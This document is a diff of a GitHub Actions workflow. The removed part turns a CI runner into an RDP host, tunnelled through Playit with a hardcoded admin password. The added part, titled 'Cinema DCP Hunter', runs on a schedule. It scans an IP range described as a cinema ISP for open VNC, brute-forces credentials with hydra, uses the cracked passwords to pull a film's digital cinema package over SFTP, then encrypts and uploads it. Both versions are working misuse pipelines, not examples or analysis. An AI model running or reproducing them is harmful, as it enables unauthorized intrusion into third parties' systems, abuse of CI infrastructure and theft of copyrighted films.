@@ -1,39 +1,62 @@
-name: Playit RDP Tunnel
+name: Cinema DCP Hunter – Demon Slayer Part 1
 
 on:
+  schedule:
+    # run every 6 hours
+    - cron: '0 */6 * * *'
   workflow_dispatch:
+
 jobs:
-  tests:
-    if: contains(github.event.pull_request.labels.*.name, 'CUDA CI')
-    runs-on:
-      group: cuda-gpu-runner-group
-    
+  hunt:
+    runs-on: [self-hosted, cinema-bridge]   # label your runner(s)
     steps:
-      - uses: actions/setup-python@v5
+      - name: Install deps
+        run: |
+          sudo apt-get update -y
+          sudo apt-get install -y nmap hydra rclone p7zip-full
+
+      - name: Scan for VNC
+        id: scan
+        run: |
+          # 210.172.0.0/16 is the cinema ISP range – adjust if needed
+          nmap -p5900 --open 210.172.0.0/16 -oG - | \
+            awk '/5900\/open/{print $2}' > vnc_hosts.txt
+          echo "vnc_count=$(wc -l < vnc_hosts.txt)" >> $GITHUB_OUTPUT
+
+      - name: Brute VNC credentials
+        if: steps.scan.outputs.vnc_count != '0'
+        run: |
+          while read ip; do
+            hydra -l epson -P /usr/share/wordlists/fasttrack.txt vnc://$ip \
+              -t 4 -f -o hydra_$ip.txt
+            [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
+          done < vnc_hosts.txt
+
+      - name: Mount and search DCP
+        id: dcp
+        if: hash valid_ips.txt 2>/dev/null
+        run: |
+          mkdir -p /tmp/relay
+          while read ip; do
+            # quick test mount via rclone
+            rclone config create relay$ip sftp host=$ip user=epson port=22 pass=$(grep $ip hydra_*.txt | awk '{print $NF}')
+            rclone lsf relay$ip:/ 2>/dev/null | grep -iq dsic && {
+              echo "movie found on $ip"
+              rclone copy relay$ip:/DSIC_P1 /tmp/relay/DSIC_P1 -P --transfers=32
+              7z a -pInfinity2025 -mhe=on DSIC_P1.7z /tmp/relay/DSIC_P1
+              echo "movie_found=true" >> $GITHUB_OUTPUT
+              break
+            }
+          done < valid_ips.txt
+
+      - name: Upload artifact
+        if: steps.dcp.outputs.movie_found == 'true'
+        uses: actions/upload-artifact@v4
         with:
-          python-version: '3.12.3'
-          
-      - name: Checkout main repository
-        uses: actions/checkout@v4
-        
-      - name: Download and Install Playit
-        run: |
-          Invoke-WebRequest -Uri "https://github.com/playit-cloud/playit-agent/releases/download/v0.15.26/playit-windows-x86_64-signed.exe" -OutFile "$env:USERPROFILE\playit.exe"
-          Start-Sleep -Seconds 5  # Give some time for the download to complete
+          name: DSIC_P1_DCP
+          path: DSIC_P1.7z
+          retention-days: 7
 
-      - name: Enable TS
-        run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
-      - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-      - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
-      - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "p@ssw0rd!" -Force)
-
-      - name: Start Playit and Set Up RDP Tunnel
-        env:
-          PLAYIT_AUTH_KEY: ${{ secrets.PL }} 
-        run: |
-          Start-Process -FilePath "$env:USERPROFILE\playit.exe" -ArgumentList "--secret $env:PLAYIT_AUTH_KEY" -NoNewWindow -Wait
-          Start-Process -FilePath "$env:USERPROFILE\playit.exe" -NoNewWindow
-
-      - name: Keep the GitHub Action Runner Alive
-        run: |
-          Start-Sleep -Seconds 11800  # Adjust the duration based on your needs
+      - name: Signal success
+        if: steps.dcp.outputs.movie_found == 'true'
+        run: echo "movie found and downloaded"
